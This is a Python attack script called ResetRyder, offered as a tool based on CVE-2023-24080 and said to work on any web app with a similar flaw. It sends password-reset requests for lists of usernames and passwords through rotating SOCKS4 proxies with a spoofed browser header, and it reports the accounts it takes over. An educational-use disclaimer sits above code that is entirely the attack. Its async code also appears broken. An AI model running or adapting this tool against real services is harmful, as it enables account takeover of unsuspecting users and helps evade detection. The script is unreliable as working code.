import time
import requests
import random
import argparse
import asyncio

# Developer: SirCryptic (NullSecurityTeam)
# Info:      ResetRyder - Brute force password reset tool - By NullSecurityTeam
# Note/s:    Based on CVE-2023-24080 not only just for Chamberlain myQ v5.222.0.32277 (on iOS)
#            This code will work for any web application that has a similar vulnerability.
#            The author of this script is not responsible for any damage caused by the use or misuse of this script. 
#            These PoCs are intended for educational and research purposes only, and should never be used to target or exploit systems without explicit permission from the owner.

password_list_path = ""
username_list_path = ""
reset_password_url = ""
rate_limit_time = 1
proxy_list_path = ""
max_retries = 3
max_timeout = 10
max_concurrent_requests = 10

parser = argparse.ArgumentParser(description="ResetRyder - Brute force password reset tool - By NullSecurityTeam")
parser.add_argument("-p", "--password_list", required=True, help="Path to the password list file")
parser.add_argument("-u", "--username_list", required=True, help="Path to the username list file")
parser.add_argument("-r", "--reset_password_url", required=True, help="Reset password URL")
parser.add_argument("-t", "--rate_limit_time", type=int, default=1, help="Rate limiting time in seconds (e.g., 1)")
parser.add_argument("-x", "--proxy_list", required=True, help="Path to the SOCKS4 proxy list file")
parser.add_argument("-a", "--max_retries", type=int, default=3, help="Maximum number of retries for failed requests")
parser.add_argument("-o", "--max_timeout", type=int, default=10, help="Maximum timeout for requests in seconds")
parser.add_argument("-c", "--max_concurrent_requests", type=int, default=10, help="Maximum number of concurrent requests")
args = parser.parse_args()

password_list_path = args.password_list
username_list_path = args.username_list
reset_password_url = args.reset_password_url
rate_limit_time = args.rate_limit_time
proxy_list_path = args.proxy_list
max_retries = args.max_retries
max_timeout = args.max_timeout
max_concurrent_requests = args.max_concurrent_requests

with open(password_list_path, "r") as f:
    password_list = [line.strip() for line in f]

with open(username_list_path, "r") as f:
    username_list = [line.strip() for line in f]

with open(proxy_list_path, "r") as f:
    proxy_list = [line.strip() for line in f]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

async def reset_password(username, password):
    for i in range(max_retries):
        payload = {"username": username, "new_password": password, "confirm_new_password": password}
        proxy = {"socks4": proxy_list[random.randint(0, len(proxy_list) - 1)]}
        try:
            response = await asyncio.wait_for(requests.post(reset_password_url, headers=headers, data=payload, proxies=proxy, timeout=max_timeout), timeout=max_timeout)
            if "password reset successful" in response.text.lower():
                print(f"Password reset successful for user {username}. New password: {password}")
                return True
            else:
                print(f"Password reset failed for user {username} and password: {password}")
        except:
            pass
    return False

async def main():
    tasks = []
    semaphore = asyncio.Semaphore(max_concurrent_requests)
    async with semaphore:
        for username in username_list:
            for password in password_list:
                task = asyncio.create_task(reset_password(username, password))
                tasks.append(task)
                await asyncio.sleep(rate_limit_time)
    results = await asyncio.gather(*tasks)
    print(f"Total requests: {len(results)}, Successful requests: {sum(results)}")

asyncio.run(main())
